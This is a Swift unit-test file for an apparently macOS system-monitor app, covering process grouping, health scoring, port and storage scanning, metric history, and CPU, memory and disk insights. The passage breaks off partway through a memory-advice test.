import Foundation
import AppKit
import Testing
@testable import MacVitals

@Suite("Process grouping")
struct ProcessGroupingTests {
    @Test func nestedHelperAppsRollUpToOutermostBundle() {
        let path = "/Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/140/Helpers/Google Chrome Helper (Renderer).app/Contents/MacOS/Google Chrome Helper (Renderer)"
        #expect(ProcessGrouping.outermostAppBundle(in: path) == "/Applications/Google Chrome.app")
    }

    @Test func plainBinaryHasNoBundle() {
        #expect(ProcessGrouping.outermostAppBundle(in: "/opt/homebrew/bin/node") == nil)
        #expect(ProcessGrouping.outermostAppBundle(in: "") == nil)
    }

    @Test func xpcServiceIsAttributedToResponsibleApp() {
        let webContent = "/System/Library/Frameworks/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent"
        let group = ProcessGrouping.classify(path: webContent, responsiblePath: "/Applications/Safari.app/Contents/MacOS/Safari")
        #expect(group == .application(bundlePath: "/Applications/Safari.app"))
    }

    @Test func terminalChildrenGroupUnderTerminal() {
        let group = ProcessGrouping.classify(
            path: "/opt/homebrew/bin/node",
            responsiblePath: "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal"
        )
        #expect(group == .application(bundlePath: "/System/Applications/Utilities/Terminal.app"))
    }

    @Test func disclaimedHelperBundleJoinsTheAppThatStartedIt() {
        // Claude Code: its own tiny bundle in Application Support, started via Claude's
        // `disclaimer` helper, which disclaims responsibility (so responsiblePath is nil).
        let group = ProcessGrouping.classify(
            path: "/Users/me/Library/Application Support/Claude/claude-code/2.1.281/claude.app/Contents/MacOS/claude",
            responsiblePath: nil,
            ancestorPaths: { ["/Applications/Claude.app/Contents/Helpers/disclaimer", "/Applications/Claude.app/Contents/MacOS/Claude"] }
        )
        #expect(group == .application(bundlePath: "/Applications/Claude.app"))
    }

    @Test func helperBundleStartedByMacOSKeepsItsOwnEntry() {
        // Microsoft AutoUpdate lives in Application Support but is launched by launchd (no app ancestor).
        let path = "/Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app/Contents/MacOS/Microsoft AutoUpdate"
        #expect(ProcessGrouping.classify(path: path, responsiblePath: nil, ancestorPaths: { [] })
                == .application(bundlePath: "/Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app"))
    }

    @Test func realAppsNeverGetAbsorbedByTheirParent() {
        // An app in /Applications stays itself even if another app spawned it directly.
        let group = ProcessGrouping.classify(path: "/Applications/Slack.app/Contents/MacOS/Slack", responsiblePath: nil,
                                             ancestorPaths: { ["/Applications/Xcode.app/Contents/MacOS/Xcode"] })
        #expect(group == .application(bundlePath: "/Applications/Slack.app"))
    }

    @Test func disclaimedPlainBinaryJoinsAncestorApp() {
        let group = ProcessGrouping.classify(path: "/opt/homebrew/bin/node", responsiblePath: nil,
                                             ancestorPaths: { ["/bin/zsh", "/Applications/iTerm.app/Contents/MacOS/iTerm2"] })
        #expect(group == .application(bundlePath: "/Applications/iTerm.app"))
    }

    @Test func parentLookupWorksOnThisMac() {
        #expect(ProcessSampler.parentPID(of: getpid()) != nil)
        // launchd is root-owned; we can't read it, and the ancestor walk stops there anyway.
        #expect((ProcessSampler.parentPID(of: 1) ?? 0) == 0)
    }

    @Test func systemDaemonsGroupAsMacOS() {
        #expect(ProcessGrouping.classify(path: "/usr/libexec/trustd", responsiblePath: nil) == .system)
        #expect(ProcessGrouping.classify(path: "/System/Library/CoreServices/launchservicesd", responsiblePath: nil) == .system)
    }

    @Test func thirdPartyDaemonStandsAlone() {
        #expect(ProcessGrouping.classify(path: "/opt/homebrew/opt/postgresql/bin/postgres", responsiblePath: nil) == .standalone)
    }

    @Test func appTotalsSumChildProcesses() {
        let app = AppUsage(id: "x", name: "X", bundlePath: nil, kind: .application, processes: [
            ProcessUsage(pid: 1, name: "a", path: "", cpu: 10, memory: 100, diskReadRate: 1, diskWriteRate: 2),
            ProcessUsage(pid: 2, name: "b", path: "", cpu: 5.5, memory: 50, diskReadRate: 3, diskWriteRate: 4),
        ])
        #expect(app.cpu == 15.5)
        #expect(app.memory == 150)
        #expect(app.diskTotalRate == 10)
    }
}

@Suite("Health score")
struct HealthEvaluatorTests {
    private func inputs(
        cpu: Double = 10,
        freeFraction: Double = 0.5,
        pressure: MemoryPressure = .normal,
        swap: UInt64 = 0,
        thermal: ThermalLevel = .nominal,
        battery: BatterySnapshot? = nil,
        uptimeDays: Double = 1
    ) -> HealthInputs {
        var memory = MemorySnapshot()
        memory.total = 16 << 30
        memory.pressure = pressure
        memory.swapUsed = swap
        var disk = DiskSnapshot()
        disk.totalCapacity = 1_000_000_000_000
        disk.availableCapacity = Int64(Double(disk.totalCapacity) * freeFraction)
        return HealthInputs(cpuAverage: cpu, memory: memory, disk: disk, battery: battery,
                            thermal: thermal, uptime: uptimeDays * 86_400)
    }

    @Test func healthyMacScoresPerfect() {
        let report = HealthEvaluator.evaluate(inputs())
        #expect(report.score == 100)
        #expect(report.issues.isEmpty)
        #expect(report.grade == "Excellent")
    }

    @Test func nearlyFullDiskIsCriticalAndPointsToCleanup() {
        let report = HealthEvaluator.evaluate(inputs(freeFraction: 0.03))
        let issue = try! #require(report.issues.first)
        #expect(issue.severity == .critical)
        #expect(issue.section == .cleanup)
        #expect(report.score == 70)
    }

    @Test func criticalIssuesSortFirst() {
        let report = HealthEvaluator.evaluate(inputs(cpu: 70, pressure: .critical, uptimeDays: 30))
        #expect(report.issues.map(\.id) == ["memory", "cpu", "uptime"])
    }

    @Test func penaltiesStackAndClampAtZero() {
        let report = HealthEvaluator.evaluate(inputs(cpu: 95, freeFraction: 0.01, pressure: .critical,
                                                     swap: 12 << 30, thermal: .critical, uptimeDays: 40))
        #expect(report.score == 0)
        #expect(report.grade == "Needs attention")
    }

    @Test func checklistCoversEveryFactorAndFlagsProblems() {
        let report = HealthEvaluator.evaluate(inputs(freeFraction: 0.08))
        #expect(report.checks.map(\.id) == ["disk", "memory", "cpu", "thermal", "uptime"])
        #expect(report.checks.first { $0.id == "disk" }?.severity == .warning)
        #expect(report.checks.filter { $0.id != "disk" }.allSatisfy { $0.severity == nil })
    }

    @Test func swapFoldsIntoMemoryCheck() {
        let report = HealthEvaluator.evaluate(inputs(swap: 12 << 30))
        let memory = try! #require(report.checks.first { $0.id == "memory" })
        #expect(memory.severity == .warning)
        #expect(memory.value.contains("swap"))
    }

    @Test func batteryAppearsInChecklistOnlyWhenPresent() {
        var battery = BatterySnapshot()
        battery.designCapacity = 5000
        battery.maxCapacity = 4600
        #expect(HealthEvaluator.evaluate(inputs(battery: battery)).checks.contains { $0.id == "battery" })
        #expect(!HealthEvaluator.evaluate(inputs()).checks.contains { $0.id == "battery" })
    }

    @Test func everyIssueHasCompactCopyThatFitsThePanel() {
        var battery = BatterySnapshot()
        battery.designCapacity = 5000
        battery.maxCapacity = 3000
        let scenarios = [
            inputs(cpu: 95, freeFraction: 0.03, pressure: .critical, swap: 12 << 30, thermal: .critical, battery: battery, uptimeDays: 40),
            inputs(cpu: 70, freeFraction: 0.08, pressure: .warning, swap: 3 << 30, thermal: .serious),
            inputs(freeFraction: 0.12, thermal: .fair),
        ]
        let issues = scenarios.flatMap { HealthEvaluator.evaluate($0).issues }
        #expect(Set(issues.map(\.id)) == ["disk", "memory", "swap", "cpu", "thermal", "battery", "uptime"])
        for issue in issues {
            #expect(!issue.shortTitle.isEmpty && issue.shortTitle.count <= 22, "\(issue.shortTitle)")
            #expect(!issue.metric.isEmpty && issue.metric.count <= 14, "\(issue.metric)")
        }
    }

    @Test func menuBarBadgeIgnoresInfoLevelIssues() {
        // Restart-recommended is info-level: no badge.
        #expect(Attention(HealthEvaluator.evaluate(inputs(uptimeDays: 30))) == .none)
        #expect(Attention(HealthEvaluator.evaluate(inputs(freeFraction: 0.08))) == .warning)
        #expect(Attention(HealthEvaluator.evaluate(inputs(freeFraction: 0.08, pressure: .critical))) == .critical)
    }

    @Test func degradedBatteryIsFlagged() {
        var battery = BatterySnapshot()
        battery.designCapacity = 5000
        battery.maxCapacity = 3500
        let report = HealthEvaluator.evaluate(inputs(battery: battery))
        #expect(report.issues.first?.id == "battery")
        #expect(report.issues.first?.severity == .warning)
    }
}

@Suite("Ports")
struct PortScannerTests {
    @Test func parsesLsofFieldOutput() {
        let output = """
        p4312
        cnode
        f23
        n*:3000
        f24
        n[::1]:3000
        p911
        cpostgres
        f7
        n127.0.0.1:5432
        """
        let entries = PortScanner.parse(lsofOutput: output)
        #expect(entries.count == 3)
        #expect(entries[0] == .init(pid: 4312, command: "node", address: "*", port: 3000))
        #expect(entries[1].address == "[::1]")
        #expect(entries[2] == .init(pid: 911, command: "postgres", address: "127.0.0.1", port: 5432))
    }

    @Test func loopbackOnlyDetection() {
        let local = ListeningPort(pid: 1, command: "vite", port: 5173, addresses: ["127.0.0.1", "[::1]"], workingDirectory: nil)
        let exposed = ListeningPort(pid: 1, command: "node", port: 3000, addresses: ["*"], workingDirectory: nil)
        #expect(local.isLocalOnly)
        #expect(!exposed.isLocalOnly)
    }

    @Test func projectNameComesFromWorkingDirectory() {
        let home = FileManager.default.homeDirectoryForCurrentUser.path
        let port = ListeningPort(pid: 1, command: "node", port: 3000, addresses: ["*"], workingDirectory: home + "/Developer/acme-web")
        #expect(port.projectName == "acme-web")
        #expect(port.isDevServer)
        let system = ListeningPort(pid: 1, command: "rapportd", port: 49152, addresses: ["*"], workingDirectory: nil)
        #expect(!system.isDevServer)
    }
}

@Suite("History")
struct MetricHistoryTests {
    private func sample(_ date: Date, cpu: Double) -> HistorySample {
        HistorySample(date: date, cpuUser: cpu, cpuSystem: 0, memoryUsedPercent: 0, networkIn: 0,
                      networkOut: 0, diskRead: 0, diskWrite: 0, batteryPercent: nil)
    }

    @Test func dropsOldestBeyondCapacity() {
        var history = MetricHistory(capacity: 3)
        let now = Date()
        for i in 0..<5 { history.append(sample(now.addingTimeInterval(Double(i)), cpu: Double(i))) }
        #expect(history.samples.map(\.cpuUser) == [2, 3, 4])
    }

    @Test func averageRespectsWindow() {
        var history = MetricHistory(capacity: 100)
        let now = Date()
        history.append(sample(now.addingTimeInterval(-120), cpu: 100))
        history.append(sample(now.addingTimeInterval(-30), cpu: 20))
        history.append(sample(now, cpu: 40))
        #expect(history.average(\.cpuTotal, over: 60, now: now) == 30)
    }
}

@Suite("Formatting & motion")
struct MiscTests {
    @Test func percentFormatting() {
        #expect(Fmt.percent(42.4) == "42%")
        #expect(Fmt.percent(3.14159, digits: 1) == "3.1%")
        #expect(Fmt.percent(.nan) == "0%")
    }

    @Test func networkMeterUsesLogScale() {
        #expect(NetworkLevels.level(for: 500) == 0)            // below 1 KB/s is silent
        #expect(NetworkLevels.level(for: 1_000_000) == 0.6)    // 1 MB/s → 3 of 5 decades
        #expect(NetworkLevels.level(for: 1e12) == 1)           // clamps
    }

    @Test func motionPolicyHonorsReduceMotion() {
        #expect(!MotionPolicy.resolve(reduceMotion: true, userEnabled: true, active: true).enabled)
        #expect(!MotionPolicy.resolve(reduceMotion: false, userEnabled: true, active: false).enabled)
        #expect(MotionPolicy.resolve(reduceMotion: false, userEnabled: true, active: true).enabled)
    }
}

@Suite("Tiered history")
struct TieredHistoryTests {
    private func sample(_ date: Date, cpu: Double, battery: Double? = nil) -> HistorySample {
        HistorySample(date: date, cpuUser: cpu, cpuSystem: 0, memoryUsedPercent: 50, networkIn: 0,
                      networkOut: 0, diskRead: 0, diskWrite: 0, batteryPercent: battery)
    }

    /// A recent 15-minute boundary (so nothing gets pruned), which is also a minute boundary.
    private var start: Date {
        Date(timeIntervalSinceReferenceDate: floor(Date().timeIntervalSinceReferenceDate / 900) * 900 - 3 * 3600)
    }

    @Test func minuteTierAveragesEachMinute() {
        var history = TieredHistory()
        // Two minutes of samples every 5s: minute 1 at 10%, minute 2 at 30%, then one sample in minute 3.
        for i in 0..<12 { history.append(sample(start.addingTimeInterval(Double(i) * 5), cpu: 10)) }
        for i in 12..<24 { history.append(sample(start.addingTimeInterval(Double(i) * 5), cpu: 30)) }
        history.append(sample(start.addingTimeInterval(120), cpu: 90))
        #expect(history.minute.map(\.cpuUser) == [10, 30])
        #expect(history.minute[0].date == start.addingTimeInterval(30)) // bucket midpoint
    }

    @Test func dayRangeIncludesInProgressBucket() {
        var history = TieredHistory()
        for i in 0..<3 { history.append(sample(start.addingTimeInterval(Double(i) * 5), cpu: 40)) }
        let day = history.samples(for: .day, now: start.addingTimeInterval(20))
        #expect(day.count == 1)
        #expect(day.first?.cpuUser == 40)
    }

    @Test func gapsSplitChartSegments() {
        var history = TieredHistory()
        let now = Date()
        history.append(sample(now.addingTimeInterval(-600), cpu: 10))
        history.append(sample(now.addingTimeInterval(-595), cpu: 10))
        // Mac Vitals "not running" for 5 minutes.
        history.append(sample(now.addingTimeInterval(-290), cpu: 20))
        history.append(sample(now.addingTimeInterval(-285), cpu: 20))
        let points = history.points(\.cpuUser, series: "CPU", range: .hour)
        #expect(points.map(\.segment) == [0, 0, 1, 1])
    }

    @Test func chartDownsamplingCapsPointsWithoutCrossingGaps() {
        let now = Date()
        var points = (0..<1000).map { ChartPoint(date: now.addingTimeInterval(Double($0)), value: 10, series: "CPU", segment: $0 < 500 ? 0 : 1) }
        points[10] = ChartPoint(date: points[10].date, value: 50, series: "CPU", segment: 0)
        let reduced = TieredHistory.downsample(points, to: 360)
        #expect(reduced.count <= 362)
        #expect(Set(reduced.map(\.segment)) == [0, 1])
        // No averaged point mixes the two segments: segment-0 points all come before segment-1.
        let firstOne = reduced.firstIndex { $0.segment == 1 }!
        #expect(reduced[..<firstOne].allSatisfy { $0.segment == 0 })
        #expect(reduced.contains { $0.value > 10 }) // the spike still shows (averaged, not dropped)
    }

    @Test func batteryAveragesIgnoreMissingSamples() {
        var history = TieredHistory()
        history.append(sample(start, cpu: 0, battery: 80))
        history.append(sample(start.addingTimeInterval(5), cpu: 0, battery: nil))
        history.append(sample(start.addingTimeInterval(10), cpu: 0, battery: 60))
        history.append(sample(start.addingTimeInterval(60), cpu: 0)) // closes the first minute
        #expect(history.minute.first?.batteryPercent == 70)
    }

    @Test func persistenceRoundTripsAndPrunesOldData() throws {
        let url = FileManager.default.temporaryDirectory.appending(path: "mv-history-\(UUID().uuidString).json")
        defer { try? FileManager.default.removeItem(at: url) }
        var history = TieredHistory()
        for i in 0..<130 { history.append(sample(start.addingTimeInterval(Double(i) * 5), cpu: Double(i % 7))) }
        HistoryPersistence.save(history, to: url)
        // Reload while still inside the last minute: identical state, in-progress bucket intact.
        let lastSample = start.addingTimeInterval(129 * 5)
        let restored = HistoryPersistence.load(from: url, now: lastSample)
        #expect(restored.minute.map(\.cpuUser) == history.minute.map(\.cpuUser))
        #expect(restored.live.samples.count == history.live.samples.count)
        #expect(restored.samples(for: .day, now: lastSample).count == history.samples(for: .day, now: lastSample).count)

        // Anything older than 30 days is dropped on load.
        let old = TieredHistory.Archive(minute: [], quarter: [sample(Date().addingTimeInterval(-40 * 86_400), cpu: 1)])
        #expect(TieredHistory(archive: old).quarter.isEmpty)
    }

    @Test func restartMidBucketContinuesTheAverage() throws {
        let url = FileManager.default.temporaryDirectory.appending(path: "mv-resume-\(UUID().uuidString).json")
        defer { try? FileManager.default.removeItem(at: url) }
        let bucketStart = start
        var before = TieredHistory()
        // 5 minutes at 10% inside one 15-minute bucket, then the app quits.
        for i in 0..<60 { before.append(sample(bucketStart.addingTimeInterval(Double(i) * 5), cpu: 10)) }
        HistoryPersistence.save(before, to: url)

        // Relaunch 1 minute later, same 15-minute bucket: 5 more minutes at 40%.
        var after = HistoryPersistence.load(from: url, now: bucketStart.addingTimeInterval(360))
        #expect(after.live.samples.count == 60) // last hour of raw samples restored
        for i in 0..<60 { after.append(sample(bucketStart.addingTimeInterval(360 + Double(i) * 5), cpu: 40)) }
        // Cross into the next 15-minute bucket to close it out.
        after.append(sample(bucketStart.addingTimeInterval(900), cpu: 0))
        let closed = try #require(after.quarter.last)
        #expect(closed.cpuUser == 25) // (60 × 10 + 60 × 40) / 120: both sessions counted
    }

    @Test func staleBucketIsClosedOutOnLoad() {
        var history = TieredHistory()
        for i in 0..<12 { history.append(sample(start.addingTimeInterval(Double(i) * 5), cpu: 20)) }
        // Reopen an hour later: the saved half-bucket becomes a finished data point.
        let reopened = TieredHistory(archive: history.archive, now: start.addingTimeInterval(3_600))
        #expect(reopened.quarter.count == 1)
        #expect(reopened.minute.last?.cpuUser == 20)
    }

    @Test func missingFileLoadsEmpty() {
        let history = HistoryPersistence.load(from: URL(fileURLWithPath: "/nonexistent/history.json"))
        #expect(history.minute.isEmpty && history.quarter.isEmpty)
    }
}

@Suite("CPU insights")
struct CPUInsightsTests {
    @Test func levelsFromRecentAverage() {
        #expect(CPUInsights.level(forAverage: 8) == .relaxed)
        #expect(CPUInsights.level(forAverage: 40) == .busy)
        #expect(CPUInsights.level(forAverage: 70) == .workingHard)
        #expect(CPUInsights.level(forAverage: 97) == .maxedOut)
    }

    @Test func demandIsRelativeToCoreCount() {
        #expect(CPUInsights.demand(loadAverage: 3, cores: 10) == .light)
        #expect(CPUInsights.demand(loadAverage: 3, cores: 4) == .moderate)
        #expect(CPUInsights.demand(loadAverage: 12, cores: 8) == .heavy)
    }

    @Test func appShareIsFractionOfTotalCapacity() {
        // 250% of one core on an 8-core Mac is 31.25% of the whole CPU.
        #expect(CPUInsights.shareOfTotal(appCPU: 250, cores: 8) == 31.25)
    }

    @Test func singleCoreBottleneckOnlyWhenOverallIsQuiet() {
        #expect(CPUInsights.singleCoreBottleneck(perCore: [5, 99, 3, 4], total: 25) == 1)
        #expect(CPUInsights.singleCoreBottleneck(perCore: [95, 99, 97, 96], total: 97) == nil)
        #expect(CPUInsights.singleCoreBottleneck(perCore: [5, 60, 3, 4], total: 18) == nil)
    }

    @Test func appleSiliconClustersPutEfficiencyFirstInNumbering() {
        let clusters = CPUInsights.clusters(coreCount: 8, efficiency: 2, performance: 6)
        #expect(clusters.map(\.name) == ["Performance", "Efficiency"])
        #expect(clusters[0].range == 2..<8)
        #expect(clusters[1].range == 0..<2)
        #expect(CPUInsights.clusters(coreCount: 4, efficiency: nil, performance: nil).map(\.name) == ["Cores"])
    }

    @Test func everySectionHasAGuide() {
        for section in DashboardSection.allCases {
            let guide = SectionGuide.for(section)
            #expect(!guide.title.isEmpty && !guide.summary.isEmpty)
        }
    }
}

@Suite("Self-awareness")
struct SelfAwarenessTests {
    @Test func appRecognizesItsOwnProcess() {
        let own = ProcessInfo.processInfo.processIdentifier
        let me = AppUsage(id: "me", name: "Mac Vitals", bundlePath: nil, kind: .application, processes: [
            ProcessUsage(pid: own, name: "MacVitals", path: "", cpu: 20, memory: 1, diskReadRate: 0, diskWriteRate: 0),
        ])
        let other = AppUsage(id: "other", name: "Safari", bundlePath: nil, kind: .application, processes: [
            ProcessUsage(pid: own + 1, name: "Safari", path: "", cpu: 5, memory: 1, diskReadRate: 0, diskWriteRate: 0),
        ])
        #expect(me.isCurrentApp)
        #expect(!other.isCurrentApp)
    }
}

@Suite("Memory insights")
struct MemoryInsightsTests {
    @Test func verdictFollowsPressureNotUsedPercent() {
        #expect(MemoryInsights.level(pressure: .normal, swapUsed: 0) == .comfortable)
        #expect(MemoryInsights.level(pressure: .normal, swapUsed: 3 << 30) == .recentlyTight)
        #expect(MemoryInsights.level(pressure: .warning, swapUsed: 0) == .gettingTight)
        #expect(MemoryInsights.level(pressure: .critical, swapUsed: 0) == .underStrain)
        // A little swap is housekeeping, not a problem.
        #expect(MemoryInsights.level(pressure: .normal, swapUsed: 200 << 20) == .comfortable)
    }

    @Test func compositionCoversEverySliceWithPlainNames() {
        var memory = MemorySnapshot()
        memory.total = 16 << 30
        memory.app = 6 << 30; memory.wired = 2 << 30; memory.compressed = 1 << 30
        memory.cached = 5 << 30; memory.free = 2 << 30
        let slices = MemoryInsights.composition(memory)
        #expect(slices.map(\.name) == ["Apps", "System", "Compressed", "Ready to reuse", "Free"])
        #expect(slices.reduce(0) { $0 + $1.bytes } == memory.total)
        #expect(slices.allSatisfy { !$0.meaning.isEmpty })
        #expect(MemoryInsights.shareOfRAM(4 << 30, total: 16 << 30) == 25)
    }

    @Test func swapIsAveragedIntoHistoryAndOldFilesStillDecode() throws {
        let start = Date(timeIntervalSinceReferenceDate: floor(Date().timeIntervalSinceReferenceDate / 900) * 900 - 3600)
        var history = TieredHistory()
        func s(_ t: TimeInterval, swap: Double?) -> HistorySample {
            HistorySample(date: start.addingTimeInterval(t), cpuUser: 0, cpuSystem: 0, memoryUsedPercent: 50, networkIn: 0,
                          networkOut: 0, diskRead: 0, diskWrite: 0, batteryPercent: nil, swapUsed: swap)
        }
        history.append(s(0, swap: 1_000))
        history.append(s(5, swap: 3_000))
        history.append(s(60, swap: nil))
        #expect(history.minute.first?.swapUsed == 2_000)

        // A v1 file (no swap, no live tier, no buckets) must still load.
        let legacy = #"{"version":1,"minute":[{"date":\#(start.timeIntervalSinceReferenceDate),"cpuUser":1,"cpuSystem":1,"memoryUsedPercent":40,"networkIn":0,"networkOut":0,"diskRead":0,"diskWrite":0}],"quarter":[]}"#
        let archive = try JSONDecoder().decode(TieredHistory.Archive.self, from: Data(legacy.utf8))
        #expect(archive.minute.count == 1)
        #expect(archive.minute[0].swapUsed == nil)
    }
}

@Suite("Disk insights")
struct DiskInsightsTests {
    @Test func levelsMatchHealthScoreThresholds() {
        #expect(DiskInsights.level(freePercent: 40) == .plenty)
        #expect(DiskInsights.level(freePercent: 12) == .gettingFull)
        #expect(DiskInsights.level(freePercent: 7) == .runningLow)
        #expect(DiskInsights.level(freePercent: 3) == .almostFull)
    }

    @Test func updateHeadroomWarning() {
        #expect(DiskInsights.tooSmallForUpdates(available: 12_000_000_000))
        #expect(!DiskInsights.tooSmallForUpdates(available: 180_000_000_000))
        #expect(!DiskInsights.tooSmallForUpdates(available: 0)) // unknown, don't warn
    }

    @Test func freeSpaceTrend() {
        func s(_ free: Double?) -> HistorySample {
            HistorySample(date: Date(), cpuUser: 0, cpuSystem: 0, memoryUsedPercent: 0, networkIn: 0, networkOut: 0,
                          diskRead: 0, diskWrite: 0, batteryPercent: nil, diskFree: free)
        }
        let change = DiskInsights.freeSpaceChange([s(100e9), s(nil), s(96.8e9)])
        #expect(change == -3.2e9)
        #expect(DiskInsights.describeChange(-3.2e9, over: .day) == "Free space went down by 3.2 GB over the last 24 hours.")
        #expect(DiskInsights.describeChange(-100e6, over: .day) == "Free space has been steady over the last 24 hours.")
        #expect(DiskInsights.freeSpaceChange([s(nil)]) == nil)
    }

    @Test func splitBytesNeverProducesLongNumbers() {
        #expect(Fmt.splitBytes(182_400_000_000) == ("182", "GB"))
        #expect(Fmt.splitBytes(12_450_000_000) == ("12.4", "GB") || Fmt.splitBytes(12_450_000_000) == ("12.5", "GB"))
        #expect(Fmt.splitBytes(1_240_000_000_000) == ("1.2", "TB"))
        #expect(Fmt.splitBytes(640_000_000) == ("640", "MB"))
    }
}

@Suite("Disk forecast")
struct DiskForecastTests {
    private func samples(hours: Int, startFree: Double, perHour: Double) -> [HistorySample] {
        let start = Date().addingTimeInterval(-Double(hours) * 3600)
        return (0...hours * 4).map { i in
            let t = Double(i) * 900
            return HistorySample(date: start.addingTimeInterval(t), cpuUser: 0, cpuSystem: 0, memoryUsedPercent: 0,
                                 networkIn: 0, networkOut: 0, diskRead: 0, diskWrite: 0, batteryPercent: nil,
                                 diskFree: startFree + perHour * t / 3600)
        }
    }

    @Test func needsHistoryBeforePredicting() {
        let result = DiskInsights.forecast(samples: samples(hours: 3, startFree: 100e9, perHour: -1e9), currentFree: 97_000_000_000)
        #expect(result == .collecting(hoursNeeded: 9))
    }

    @Test func predictsRunOutFromTrend() {
        // Losing 1 GB/hour (24 GB/day) with 96 GB free → about 4 days.
        let result = DiskInsights.forecast(samples: samples(hours: 24, startFree: 120e9, perHour: -1e9), currentFree: 96_000_000_000)
        guard case .runsOut(let days) = result else { Issue.record("expected runsOut, got \(result)"); return }
        #expect(abs(days - 4) < 0.1)
        #expect(result.sentence == "At this rate, you'll run out of space in about 4 days.")
    }

    @Test func smallChangesAreSteady() {
        #expect(DiskInsights.forecast(samples: samples(hours: 24, startFree: 100e9, perHour: -1e6), currentFree: 100_000_000_000) == .steady)
        #expect(DiskInsights.forecast(samples: samples(hours: 24, startFree: 100e9, perHour: 1e9), currentFree: 124_000_000_000) == .freeingUp)
        // Slow loss that would take years is also "steady".
        #expect(DiskInsights.forecast(samples: samples(hours: 24, startFree: 400e9, perHour: -20e6), currentFree: 400_000_000_000) == .steady)
    }

    @Test func friendlyDurations() {
        #expect(DiskInsights.describe(days: 1) == "about a day")
        #expect(DiskInsights.describe(days: 9.6) == "about 10 days")
        #expect(DiskInsights.describe(days: 40) == "about 6 weeks")
        #expect(DiskInsights.describe(days: 150) == "about 5 months")
    }
}

@Suite("Storage scanner")
struct StorageScannerTests {
    /// Builds a fake home folder: Downloads with an installer and a big video,
    /// plus a big file inside an .app bundle that must NOT be listed as a "largest file".
    private func makeHome() throws -> URL {
        let fm = FileManager.default
        let home = fm.temporaryDirectory.appending(path: "mv-home-\(UUID().uuidString)")
        let downloads = home.appending(path: "Downloads")
        try fm.createDirectory(at: downloads.appending(path: "Old Project"), withIntermediateDirectories: true)
        try Data(count: 1_000_000).write(to: downloads.appending(path: "installer.dmg"))
        try Data(count: 3_000_000).write(to: downloads.appending(path: "Old Project/notes.bin"))
        let bundle = downloads.appending(path: "Tool.app/Contents/Resources")
        try fm.createDirectory(at: bundle, withIntermediateDirectories: true)
        try Data(count: 2_000_000).write(to: bundle.appending(path: "payload.bin"))
        return home
    }

    @Test func measuresCategoryAndListsLargestChildren() throws {
        let home = try makeHome()
        defer { try? FileManager.default.removeItem(at: home) }
        let result = StorageScanner.scan(.downloads, home: home)
        #expect(result.category.size >= 6_000_000)
        #expect(!result.category.needsAccess)
        // Biggest first; folders shown with ~ paths, apps by name.
        #expect(result.category.largest.map(\.name) == ["~/Downloads/Old Project", "Tool", "~/Downloads/installer.dmg"])
    }

    @Test func largeFilesSkipAppBundleInternals() throws {
        let home = try makeHome()
        defer { try? FileManager.default.removeItem(at: home) }
        var top = TopItems(limit: 10)
        for child in try FileManager.default.contentsOfDirectory(at: home.appending(path: "Downloads"), includingPropertiesForKeys: nil) {
            _ = StorageScanner.measure(child, collect: true, into: &top)
        }
        // Threshold is 200 MB, so these small test files don't qualify; verify the filter logic directly instead.
        var direct = TopItems(limit: 2)
        direct.insert(StorageItem(path: "/a", name: "a", size: 5))
        direct.insert(StorageItem(path: "/b", name: "b", size: 9))
        direct.insert(StorageItem(path: "/c", name: "c", size: 7))
        #expect(direct.items.map(\.name) == ["b", "c"])
        #expect(top.items.allSatisfy { !$0.path.contains(".app/") })
    }

    @Test func missingFoldersAreEmptyNotDenied() {
        let result = StorageScanner.scan(.backups, home: URL(fileURLWithPath: "/nonexistent-home"))
        #expect(result.category.size == 0)
        #expect(!result.category.needsAccess)
    }

    @Test func otherIsWhateverWasNotMeasured() {
        let report = StorageReport(scannedAt: Date(), categories: [
            StorageCategory(kind: .apps, size: 40, largest: [], needsAccess: false),
            StorageCategory(kind: .documents, size: 60, largest: [], needsAccess: false),
        ], largestFiles: [])
        #expect(report.systemAndOther(used: 250) == 150)
        #expect(report.systemAndOther(used: 50) == 0)
    }

    @Test func driveHealthParsing() {
        let json = #"{"SPNVMeDataType":[{"_items":[{"_name":"APPLE SSD","smart_status":"Verified"}]}]}"#
        #expect(DriveHealth.parseStatus(Data(json.utf8)) == "Verified")
        #expect(DriveHealth.parseStatus(Data("{}".utf8)) == nil)
    }

    @Test func everyStorageKindExplainsItself() {
        for kind in StorageKind.allCases {
            #expect(!kind.title.isEmpty && !kind.explanation.isEmpty && !kind.icon.isEmpty)
        }
        #expect(StorageKind.allCases.filter(\.needsFullDiskAccess) == [.backups, .mail])
    }
}

@Suite("Memory: enough RAM & free up memory")
struct MemoryAdvisorTests {
    private func history(hours: Int, tightEvery n: Int?) -> [HistorySample] {
        let start = Date().addingTimeInterval(-Double(hours) * 3600)
        return (0..<(hours * 4)).map { i in
            HistorySample(date: start.addingTimeInterval(Double(i) * 900), cpuUser: 0, cpuSystem: 0, memoryUsedPercent: 60,
                          networkIn: 0, networkOut: 0, diskRead: 0, diskWrite: 0, batteryPercent: nil,
                          memoryTight: n.map { i % $0 == 0 ? 1 : 0 } ?? 0)
        }
    }

    @Test func adequacyNeedsHistoryFirst() {
        #expect(MemoryInsights.adequacy(samples: history(hours: 4, tightEvery: nil)) == .collecting(hoursNeeded: 9))
    }

    @Test func adequacyVerdicts() {
        #expect(MemoryInsights.adequacy(samples: history(hours: 48, tightEvery: nil)) == .plenty(comfortablePercent: 100))
        // Tight 1 in 40 samples (2.5% of the time) → mostly enough.
        guard case .mostlyEnough = MemoryInsights.adequacy(samples: history(hours: 48, tightEvery: 40)) else {
            Issue.record("expected mostlyEnough"); return
        }
        // Tight 1 in 5 (20%) → often short.
        guard case .oftenShort(let comfortable) = MemoryInsights.adequacy(samples: history(hours: 48, tightEvery: 5)) else {
            Issue.record("expected oftenShort"); return
        }
        // 192 samples, indices 0,5,…,190 tight = 39 → 79.7% comfortable.
        #expect(abs(comfortable - (100 - 39.0 / 192.0 * 100)) < 0.001)
    }

    @Test func nextMacAdviceOnlyUpsellsWhenDataSaysSo() {
        let sixteen: UInt64 = 16 << 30
        #expect(MemoryInsights.nextMacAdvice(.plenty(comfortablePercent: 99.9), installed: sixteen) == "For your next Mac, 16 GB matches how you work.")
        #expect(MemoryInsights.nextMacAdvice(.oftenShort(comfortablePercent: 80), installed: sixteen) == "For your next Mac, consider 24 GB or more.")
